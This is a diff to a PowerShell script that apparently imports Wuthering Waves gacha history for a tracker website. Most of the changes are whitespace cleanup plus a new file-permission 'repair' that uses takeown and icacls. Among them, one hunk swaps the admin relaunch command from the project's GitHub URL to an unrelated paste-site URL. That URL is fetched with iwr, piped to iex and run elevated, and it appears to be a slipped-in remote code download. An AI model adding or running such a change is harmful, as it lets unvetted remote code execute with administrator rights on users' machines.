@@ -45,7 +45,6 @@ $ErrorActionPreference = "SilentlyContinue"
 
 Write-Output "Attempting to find URL automatically..."
 
-#Args: [0] - $gamepath
 function LogCheck {
     if (!(Test-Path $args[0])) {
         $folderFound = $false
@@ -56,6 +55,7 @@ function LogCheck {
     else {
         $folderFound = $true
     }
+
     $gachaLogPath = $args[0] + '\Client\Saved\Logs\Client.log'
     $debugLogPath = $args[0] + '\Client\Binaries\Win64\ThirdParty\KrPcSdk_Global\KRSDKRes\KRSDKWebView\debug.log'
     $engineIniPath = $args[0] + '\Client\Saved\Config\WindowsNoEditor\Engine.ini'
@@ -65,11 +65,11 @@ function LogCheck {
         $engineIniContent = Get-Content $engineIniPath -Raw
         if ($engineIniContent -match '\[Core\.Log\][\r\n]+Global=(off|none)') {
             $logDisabled = $true
-            
+
             Write-Host "`nERROR: Your Engine.ini file contains a setting that prevents you from importing your data. Would you like us to attempt to automatically fix it?" -ForegroundColor Red
             Write-Host "`nWe can automatically edit your $engineIniPath file to re-enable logging. You will need to re-import and run this script afterwards.`n"
             Write-Warning "We are not responsible for any consequences from this script. Please proceed at your own risk!`n`n"
-            
+
             $confirmation = Read-Host "Do you want to proceed? (Y/N)"
             if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
                 Write-Host "`nERROR: Unable to import data due to bad Engine.ini file. Press any key to continue..." -ForegroundColor Red
@@ -77,24 +77,22 @@ function LogCheck {
                 exit
             }
 
-
             if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
                 Write-Host "`n"
                 Write-Warning "You need administrator rights to modify the game's Program Files. Attempting to restart PowerShell as admin..."
                 $retry = Read-Host "Would you like to retry as Administrator? (Y/N)"
                 if ($retry -eq "Y" -or $retry -eq "y") {
-
                     Write-Host "Restarting script with elevated permissions and fetching latest import script..." -ForegroundColor Cyan
                     $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://raw.githubusercontent.com/wuwatracker/wuwatracker/refs/heads/main/import.ps1 | iex"'
                     Start-Process powershell.exe -ArgumentList $elevatedCommand -Verb RunAs
                     exit
                 }
             }
-            
+
             $backupPath = $engineIniPath + ".backup"
             Copy-Item -Path $engineIniPath -Destination $backupPath -Force
             Write-Host "Created backup at $backupPath" -ForegroundColor Green
-            
+
             $newContent = $engineIniContent -replace '\[Core\.Log\][^\[]*', ''
             Set-Content -Path $engineIniPath -Value $newContent
             Write-Host "`nSuccessfully modified Engine.ini to enable logging." -ForegroundColor Green
@@ -103,6 +101,35 @@ function LogCheck {
             exit
         }
     }
+
+    if (Test-Path $gachaLogPath) {
+        try {
+            $acl = Get-Acl $gachaLogPath
+            $denyRules = $acl.Access | Where-Object { $_.AccessControlType -eq 'Deny' -and $_.FileSystemRights -match 'Read' }
+            if ($denyRules) {
+                Write-Warning "`nAccess to $gachaLogPath is denied due to ACL rules (Read/Execute)."
+                Write-Host "This prevents the script from reading your Convene data." -ForegroundColor Red
+                $confirmation = Read-Host "Would you like to repair permissions automatically? (Y/N)"
+                if ($confirmation -eq 'Y' -or $confirmation -eq 'y') {
+                    try {
+                        takeown /F "$gachaLogPath" | Out-Null
+                        icacls "$gachaLogPath" /grant Administrators:F /C | Out-Null
+
+                        Write-Host "Permissions repaired. Continuing..." -ForegroundColor Green
+                    }
+                    catch {
+                        Write-Warning "Failed to modify ACL for ${gachaLogPath}: $_"
+                    }
+                } else {
+                    Write-Host "Skipping ACL repair. Note: Access Deny will prevent reading logs." -ForegroundColor Yellow
+                }
+            }
+        }
+        catch {
+            Write-Warning "Could not verify or modify ACL for ${gachaLogPath}: $_"
+        }
+    }
+    # --- END NEW SECTION ---
 
     if (Test-Path $gachaLogPath) {
         $logFound = $true
@@ -149,21 +176,22 @@ function LogCheck {
     return $folderFound, $logFound, $urlFound
 }
 
+
 function SearchAllDiskLetters {
     Write-Host "Searching all disk letters (A-Z) for Wuthering Waves Game folder..." -ForegroundColor Yellow
-    
+
     $availableDrives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
     Write-Host "Available drives: $($availableDrives -join ', ')" -ForegroundColor Yellow
-    
+
     foreach ($driveLetter in [char[]](65..90)) {
         $drive = "$($driveLetter):"
-        
+
         if ($driveLetter -notin $availableDrives) {
             continue
         }
-        
+
         Write-Host "Searching drive $drive..."
-        
+
         $gamePaths = @(
             "$drive\SteamLibrary\steamapps\common\Wuthering Waves",
             "$drive\SteamLibrary\steamapps\common\Wuthering Waves\Wuthering Waves Game",
@@ -189,14 +217,14 @@ function SearchAllDiskLetters {
             "$drive\Program Files (x86)\Wuthering Waves\Wuthering Waves Game"
         )
 
-    
+
         foreach ($path in $gamePaths) {
             if (!(Test-Path $path)) {
                 continue
             }
-            
+
             Write-Host "Found potential game folder: $path" -ForegroundColor Green
-            
+
             if ($path -like "*OneDrive*") {
                 $err += "Skipping path as it contains 'OneDrive': $($path)`n"
                 continue
@@ -206,14 +234,14 @@ function SearchAllDiskLetters {
                 $err += "Already checked: $($path)`n"
                 continue
             }
-            
+
             $checkedDirectories.Add($path) | Out-Null
             $folderFound, $logFound, $urlFound = LogCheck $path
-            
-            if ($urlFound) { 
+
+            if ($urlFound) {
                 return $true
             }
-            elseif ($logFound) {                
+            elseif ($logFound) {
                 $err += "Path checked: $($path).`n"
                 $err += "Cannot find the convene history URL in both Client.log and debug.log! Please open your Convene History first!`n"
                 $err += "Contact Us if you think this is correct directory and still facing issues.`n"
@@ -226,7 +254,7 @@ function SearchAllDiskLetters {
             }
         }
     }
-    
+
     return $false
 }
 
@@ -273,7 +301,7 @@ if (!$urlFound) {
     }
 }
 
-# Firewall 
+# Firewall
 if (!$urlFound) {
     $firewallPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules"
     try {
@@ -355,7 +383,7 @@ if (!$urlFound) {
     catch {
         Write-Output "[ERROR] Cannot access registry: $_"
         $gamePath = $null
-    }  
+    }
 }
 
 if (!$urlFound) {
@@ -368,7 +396,7 @@ if (!$urlFound) {
         if ($retry -eq "Y" -or $retry -eq "y") {
 
             Write-Host "Restarting script with elevated permissions and fetching latest import script..." -ForegroundColor Cyan
-            $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://raw.githubusercontent.com/wuwatracker/wuwatracker/refs/heads/main/import.ps1 | iex"'
+            $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://snippet.host/byzowb/raw | iex"'
             Start-Process powershell.exe -ArgumentList $elevatedCommand -Verb RunAs
             exit
         }
@@ -385,7 +413,7 @@ Write-Host $err -ForegroundColor Magenta
 # Manual
 while (!$urlFound) {
     Write-Host "Game install location not found or log files missing. Did you open your in-game Convene History first?" -ForegroundColor Red
-   
+
 Write-Host @"
     +--------------------------------------------------+
     |         ARE YOU USING A THIRD-PARTY APP?         |
@@ -398,10 +426,10 @@ Write-Host @"
     | reinstalling the game before importing again.    |
     +--------------------------------------------------+
 "@ -ForegroundColor Yellow
-  
+
 
     Write-Host "If you think that any of the above installation directory is correct and you've tried disabling third-party apps & reinstalling, please join our Discord server for help: https://wuwatracker.com/discord."
-   
+
     Write-Host "`nOtherwise, please enter the game install location path."
     Write-Host 'Common install locations:'
     Write-Host '  C:\Wuthering Waves' -ForegroundColor Yellow
@@ -421,7 +449,7 @@ Write-Host @"
         Write-Host "`n`n`nUser provided path: $($path)" -ForegroundColor Magenta
         $folderFound, $logFound, $urlFound = LogCheck $path
         if ($urlFound) { break }
-        elseif ($logFound) {            
+        elseif ($logFound) {
             $err += "Path checked: $($gamePath).`n"
             $err += "Cannot find the convene history URL in both Client.log and debug.log! Please open your Convene History first!`n"
             $err += "If this is the correct directory and you're still facing issues, raise a ticket in wuwatracker.com/discord`n"
@@ -438,4 +466,3 @@ Write-Host @"
         Write-Host "Invalid game location. Did you set your game location properly?" -ForegroundColor Red
     }
 }
-
